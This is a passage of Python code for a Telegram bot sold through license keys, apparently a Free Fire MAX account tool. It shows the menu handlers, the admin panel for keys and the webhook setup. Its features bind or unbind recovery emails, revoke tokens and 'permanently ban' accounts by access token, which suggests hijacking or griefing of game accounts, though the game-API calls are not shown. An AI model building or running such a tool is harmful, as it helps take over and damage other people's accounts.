# ========== BUTTON HANDLER ==========
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if query.data.startswith('copy_'):
        key = query.data.replace('copy_', '')
        await query.edit_message_text(f"✅ Key copied!\n\n🔑 `{key}`", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Menu", callback_data='back_menu')]]))
        return

    if query.data == 'owner_panel':
        if user_id != OWNER_ID and user_id not in admin_list:
            await query.edit_message_text("❌ Only owner and admins can access this panel.")
            return
        await query.edit_message_text("👑 OWNER PANEL", reply_markup=get_owner_keyboard())
        return

    elif query.data == 'owner_status':
        if user_id != OWNER_ID and user_id not in admin_list:
            await query.answer("❌ Unauthorized", show_alert=True)
            return
        msg = f"""📊 BOT STATUS

Owner ID: {OWNER_ID}
Admins: {len(admin_list)}
Total Keys: {len(all_keys)}
Active Users: {len(active_users)}
Features: 8
Status: ✅ Active"""
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data='owner_panel')]]))
        return

    elif query.data == 'owner_admins':
        if user_id != OWNER_ID and user_id not in admin_list:
            await query.answer("❌ Unauthorized", show_alert=True)
            return
        if not admin_list:
            msg = "👥 No admins yet.\n\nTo add admin:\n/addadmin USER_ID"
        else:
            admin_list_str = "\n".join([f"• {uid}" for uid in admin_list])
            msg = f"👥 ADMINS\n\n{admin_list_str}\n\nTo remove admin:\n/removeadmin USER_ID"
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data='owner_panel')]]))
        return

    elif query.data == 'owner_genkey':
        if user_id != OWNER_ID and user_id not in admin_list:
            await query.answer("❌ Unauthorized", show_alert=True)
            return
        await query.edit_message_text("🔑 Generate User Key\n\nSend:\n/genkey NAME DAYS\n\nExamples:\n/genkey RAM PAPA 30D\n/genkey VIP 1M")
        return

    elif query.data == 'owner_genall':
        if user_id != OWNER_ID and user_id not in admin_list:
            await query.answer("❌ Unauthorized", show_alert=True)
            return
        await query.edit_message_text("🌐 Generate All Device Key\n\nSend:\n/genall NAME DAYS\n\nExamples:\n/genall ALLDEVICE 30D\n/genall GLOBAL 1M")
        return

    elif query.data == 'owner_listkeys':
        if user_id != OWNER_ID and user_id not in admin_list:
            await query.answer("❌ Unauthorized", show_alert=True)
            return
        if not all_keys:
            msg = "📋 No keys generated yet."
        else:
            key_list = []
            for k, v in list(all_keys.items())[:20]:
                key_type = v.get('type', 'user')
                key_type_label = "🌐 ALL" if key_type == "all" else "👤 USER"
                key_list.append(f"• {k} | {key_type_label} | Exp: {v.get('expiry','N/A')}")
            msg = f"📋 KEYS ({len(all_keys)})\n\n" + "\n".join(key_list)
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data='owner_panel')]]))
        return

    elif query.data == 'owner_delkey':
        if user_id != OWNER_ID and user_id not in admin_list:
            await query.answer("❌ Unauthorized", show_alert=True)
            return
        await query.edit_message_text("🗑️ Delete Key\n\nSend:\n/delkey KEY")
        return

    elif query.data == 'owner_delall':
        if user_id != OWNER_ID:
            await query.answer("❌ Only owner can delete all keys!", show_alert=True)
            return
        await query.edit_message_text("🗑️ Delete All Keys\n\nSend:\n/delallkeys\n\n⚠️ This will delete ALL keys and deactivate all users!")
        return

    elif query.data == 'owner_broadcast':
        if user_id != OWNER_ID and user_id not in admin_list:
            await query.answer("❌ Unauthorized", show_alert=True)
            return
        await query.edit_message_text("📢 Broadcast\n\nSend:\n/broadcast MESSAGE")
        return

    elif query.data == 'back_menu':
        await query.edit_message_text("RAM PAPA FREE FIRE MAX BOT\n\nChoose an option:", reply_markup=get_reply_keyboard(user_id))
        return ConversationHandler.END

    elif query.data == 'unbind_security':
        user_data[user_id]['method'] = 'security'
        await query.edit_message_text("Enter Security Code (6-digit):")
        return STATE_UNBIND_CODE

    elif query.data == 'unbind_otp':
        user_data[user_id]['method'] = 'otp'
        email = user_data[user_id].get('email', '')
        await query.edit_message_text("Sending OTP...")
        success = send_otp(user_data[user_id]['token'], email)
        if success:
            await query.edit_message_text("OTP SENT!\n\nEnter OTP:")
            return STATE_UNBIND_OTP
        else:
            await query.edit_message_text("Failed to send OTP!", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Menu", callback_data='back_menu')]]))
            return ConversationHandler.END

    elif query.data == 'change_security':
        user_data[user_id]['method'] = 'security'
        await query.edit_message_text("Enter Security Code (6-digit):")
        return STATE_CHANGE_CODE

    elif query.data == 'change_otp':
        user_data[user_id]['method'] = 'otp'
        email = user_data[user_id].get('current_email', '')
        await query.edit_message_text("Sending OTP to current email...")
        success = send_otp(user_data[user_id]['token'], email)
        if success:
            await query.edit_message_text("OTP SENT!\n\nEnter OTP:")
            return STATE_CHANGE_OTP_OLD
        else:
            await query.edit_message_text("Failed to send OTP!", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back to Menu", callback_data='back_menu')]]))
            return ConversationHandler.END

    return ConversationHandler.END

# ========== MAIN ==========
def main():
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("genkey", genkey_command))
    application.add_handler(CommandHandler("genall", genall_command))
    application.add_handler(CommandHandler("delkey", delkey_command))
    application.add_handler(CommandHandler("delallkeys", delallkeys_command))
    application.add_handler(CommandHandler("addadmin", addadmin_command))
    application.add_handler(CommandHandler("removeadmin", removeadmin_command))
    application.add_handler(CommandHandler("broadcast", broadcast_command))

    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler("start", start),
            MessageHandler(filters.Regex('^(📧 ADD RECOVERY EMAIL|🔍 CHECK RECOVERY EMAIL|❌ CANCEL PENDING|🔓 UNBIND EMAIL|🔄 CHANGE EMAIL|🚫 REVOKE TOKEN|🆘 RESUBSCRIBE|💀 PERMANENT BAN|👑 OWNER PANEL)$'), handle_reply_keyboard),
            CallbackQueryHandler(button_handler, pattern='^(add_email|check_email|cancel_pending|unbind_email|change_email|revoke_token|resubscribe|ban_account|owner_panel|owner_status|owner_admins|owner_genkey|owner_genall|owner_listkeys|owner_delkey|owner_delall|owner_broadcast|back_menu|unbind_security|unbind_otp|change_security|change_otp|copy_.*)$')
        ],
        states={
            STATE_KEY_INPUT: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_key_input)],
            STATE_ADD_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_email_token)],
            STATE_ADD_SECURITY: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_email_email)],
            STATE_ADD_OTP: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, add_email_otp),
            ],
            STATE_CHECK_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, check_email_token)],
            STATE_CANCEL_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, cancel_email_token)],
            STATE_UNBIND_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, unbind_token)],
            STATE_UNBIND_METHOD: [CallbackQueryHandler(button_handler, pattern='^(unbind_security|unbind_otp|back_menu)$')],
            STATE_UNBIND_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, unbind_security_code)],
            STATE_UNBIND_OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, unbind_otp_code)],
            STATE_CHANGE_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, change_token)],
            STATE_CHANGE_METHOD: [CallbackQueryHandler(button_handler, pattern='^(change_security|change_otp|back_menu)$')],
            STATE_CHANGE_NEW_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, change_new_email)],
            STATE_CHANGE_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, change_security_code)],
            STATE_CHANGE_OTP_OLD: [MessageHandler(filters.TEXT & ~filters.COMMAND, change_otp_old)],
            STATE_CHANGE_OTP_NEW: [MessageHandler(filters.TEXT & ~filters.COMMAND, change_otp_new)],
            STATE_REVOKE_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, revoke_token_flow)],
            STATE_RESUBSCRIBE_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, resubscribe_email)],
            STATE_BAN_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, ban_token)],
        },
        fallbacks=[
            CommandHandler("start", start),
            CallbackQueryHandler(button_handler, pattern='^back_menu$'),
            MessageHandler(filters.TEXT & ~filters.COMMAND, handle_reply_keyboard)
        ],
        allow_reentry=True,
        per_user=True,
        per_chat=True,
    )

    application.add_handler(conv_handler)
    application.add_handler(CallbackQueryHandler(button_handler, pattern='^back_menu$'))

    # ========== ✅ WEBHOOK MODE (Render Web Service ke liye) ==========
    PORT = int(os.environ.get("PORT", 10000))
    WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
    
    if WEBHOOK_URL:
        print(f"🚀 Starting bot with webhook on {WEBHOOK_URL}")
        application.run_webhook(
            listen="0.0.0.0",
            port=PORT,
            webhook_url=WEBHOOK_URL,
        )
    else:
        print("⚡ WEBHOOK_URL not set, using polling...")
        application.run_polling()

if __name__ == "__main__":
    main()
